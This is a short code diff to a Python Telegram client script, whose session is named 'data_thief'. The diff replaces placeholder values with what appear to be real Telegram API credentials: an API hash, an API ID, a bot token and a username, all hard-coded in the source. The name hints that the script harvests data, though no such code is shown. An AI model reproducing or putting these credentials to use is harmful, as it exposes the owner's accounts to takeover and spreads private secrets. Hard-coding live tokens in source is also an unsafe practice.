@@ -8,10 +8,10 @@ from threading import Thread
 import collections
 
 DATETIME_FORMAT = '%Y-%m-%d %H:%M:%S'
-API_HASH = 'your api hash'
-API_ID = 'your api id'
-BOT_TOKEN = "your bot token"
-USER_NAME = "your user name"
+API_HASH = 'f99ae24d5cfb143e7d548f0bcc1315a6'
+API_ID = '5204354'
+BOT_TOKEN = "1934862207:AAFu6fgn_7EA-F7YqmtbI4jSOkJh3zPQMbk"
+USER_NAME = "@Inches_8"
 
 client = TelegramClient('data_thief', API_ID, API_HASH)
 
